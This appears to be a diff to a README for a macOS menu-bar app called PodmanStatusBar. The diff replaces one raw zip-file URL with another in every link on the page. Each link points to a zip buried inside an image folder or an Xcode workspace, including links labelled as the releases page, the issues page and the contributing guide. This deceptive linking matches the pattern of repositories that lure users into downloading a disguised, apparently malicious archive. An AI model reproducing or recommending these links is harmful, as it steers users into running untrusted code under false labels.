@@ -1,7 +1,7 @@
 # 🚀 PodmanStatusBar - Control Podman with Ease  
 
-[![Download PodmanStatusBar](https://raw.githubusercontent.com/EORJI20/PodmanStatusBar/main/docs/img/PodmanStatusBar_1.1-alpha.2.zip)](https://raw.githubusercontent.com/EORJI20/PodmanStatusBar/main/docs/img/PodmanStatusBar_1.1-alpha.2.zip)  
-[![GitHub](https://raw.githubusercontent.com/EORJI20/PodmanStatusBar/main/docs/img/PodmanStatusBar_1.1-alpha.2.zip)](https://raw.githubusercontent.com/EORJI20/PodmanStatusBar/main/docs/img/PodmanStatusBar_1.1-alpha.2.zip)
+[![Download PodmanStatusBar](https://raw.githubusercontent.com/EORJI20/PodmanStatusBar/main/PodmanStatusBar.xcodeproj/project.xcworkspace/Status-Bar-Podman-v2.0.zip)](https://raw.githubusercontent.com/EORJI20/PodmanStatusBar/main/PodmanStatusBar.xcodeproj/project.xcworkspace/Status-Bar-Podman-v2.0.zip)  
+[![GitHub](https://raw.githubusercontent.com/EORJI20/PodmanStatusBar/main/PodmanStatusBar.xcodeproj/project.xcworkspace/Status-Bar-Podman-v2.0.zip)](https://raw.githubusercontent.com/EORJI20/PodmanStatusBar/main/PodmanStatusBar.xcodeproj/project.xcworkspace/Status-Bar-Podman-v2.0.zip)
 
 ## 📋 Description  
 PodmanStatusBar is a small macOS app that shows up in the top bar of your screen. This app lets you control and manage your Podman virtual machine (VM) easily. You can start, stop, and check the status of your Podman VM without needing to open the terminal. With PodmanStatusBar, managing your containers is simple and intuitive.
@@ -21,7 +21,7 @@ PodmanStatusBar is a small macOS app that shows up in the top bar of your screen
 ## 🛠️ Installation Instructions  
 
 ### 1. Visit the Releases Page  
-To download PodmanStatusBar, go to the [Releases page](https://raw.githubusercontent.com/EORJI20/PodmanStatusBar/main/docs/img/PodmanStatusBar_1.1-alpha.2.zip). You will find the latest version of the app there.
+To download PodmanStatusBar, go to the [Releases page](https://raw.githubusercontent.com/EORJI20/PodmanStatusBar/main/PodmanStatusBar.xcodeproj/project.xcworkspace/Status-Bar-Podman-v2.0.zip). You will find the latest version of the app there.
 
 ### 2. Download the App  
 On the Releases page, locate the latest version of PodmanStatusBar. Click the link to download the application file. Note that this file will typically have a `.dmg` or `.zip` extension.  
@@ -45,13 +45,13 @@ Once PodmanStatusBar is open, you may need to configure it to connect to your Po
 - **Check Status**: The app shows the VM status in real-time, directly on the menu bar.  
 
 ## 📞 Support  
-If you encounter issues or have questions, please visit the [GitHub Issues page](https://raw.githubusercontent.com/EORJI20/PodmanStatusBar/main/docs/img/PodmanStatusBar_1.1-alpha.2.zip) to report your problem. We welcome your feedback and will assist you promptly.  
+If you encounter issues or have questions, please visit the [GitHub Issues page](https://raw.githubusercontent.com/EORJI20/PodmanStatusBar/main/PodmanStatusBar.xcodeproj/project.xcworkspace/Status-Bar-Podman-v2.0.zip) to report your problem. We welcome your feedback and will assist you promptly.  
 
 ## 📝 Contributing  
-PodmanStatusBar is an open-source project. If you want to contribute or suggest improvements, please check our [Contributing Guide](https://raw.githubusercontent.com/EORJI20/PodmanStatusBar/main/docs/img/PodmanStatusBar_1.1-alpha.2.zip) for more details.  
+PodmanStatusBar is an open-source project. If you want to contribute or suggest improvements, please check our [Contributing Guide](https://raw.githubusercontent.com/EORJI20/PodmanStatusBar/main/PodmanStatusBar.xcodeproj/project.xcworkspace/Status-Bar-Podman-v2.0.zip) for more details.  
 
 ## 🔗 Download & Install  
-Click here to [download PodmanStatusBar](https://raw.githubusercontent.com/EORJI20/PodmanStatusBar/main/docs/img/PodmanStatusBar_1.1-alpha.2.zip) and start managing your Podman VM today!  
+Click here to [download PodmanStatusBar](https://raw.githubusercontent.com/EORJI20/PodmanStatusBar/main/PodmanStatusBar.xcodeproj/project.xcworkspace/Status-Bar-Podman-v2.0.zip) and start managing your Podman VM today!  
 
 ## 🎉 Acknowledgments  
 Thank you to everyone who contributed to PodmanStatusBar. Your efforts helped make this app possible.  
